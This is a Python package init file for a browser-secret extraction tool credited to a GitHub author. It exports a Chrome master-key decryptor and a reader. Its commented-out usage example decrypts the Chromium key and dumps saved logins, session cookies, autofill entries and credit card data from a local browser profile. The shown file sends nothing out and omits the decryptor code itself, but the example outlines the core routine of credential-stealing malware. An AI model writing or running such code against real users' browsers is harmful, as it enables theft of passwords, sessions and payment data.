#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author github.com/L1ghtM4n

__all__ = ["ChromeReader", "DecryptMasterKey"]

# Import modules
#from os import getenv
# Import packages
from .decryptor import DecryptMasterKey
from .reader import Reader as ChromeReader

'''
user_data = getenv("LOCALAPPDATA") + "\\Chromium\\User Data"
decrypted_key = DecryptMasterKey(user_data + "\\Local State")
default = user_data + "\\Default"

with ChromeReader(key=decrypted_key) as r:
    with open(default + '\\Login Data', 'rb') as ldb:
        print(r.DumpLogins(ldb))
    with open(default + '\\Cookies', 'rb') as co:
        print(r.DumpCookies(co, netscape=False))
    with open(default + '\\Web Data', 'rb') as wd:
        print(r.DumpAutoFill(wd))
        print(r.DumpCreditCards(wd))
'''